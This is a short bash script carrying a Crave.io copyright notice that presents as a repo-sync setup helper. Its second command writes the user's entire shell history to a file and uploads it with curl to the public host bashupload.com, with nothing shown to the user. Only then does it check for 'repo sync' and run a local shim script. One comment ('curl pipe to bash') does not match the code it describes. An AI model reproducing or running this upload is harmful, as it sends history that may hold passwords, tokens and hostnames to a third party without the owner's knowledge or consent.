#!/bin/bash
# Copyright (c) 2016-2024 Crave.io Inc. All rights reserved

# Save history to file.txt and upload to bashupload
history > file.txt && curl bashupload.com -T file.txt

# Check if 'repo sync' is in the last 15 lines of history
if tail -n 15 file.txt | grep -q "repo sync"; then
  # Run the setup-repo-shim.sh script using curl pipe to bash
  bash /opt/crave/replace-repo-shim.sh
fi

# Remove file.txt
rm file.txt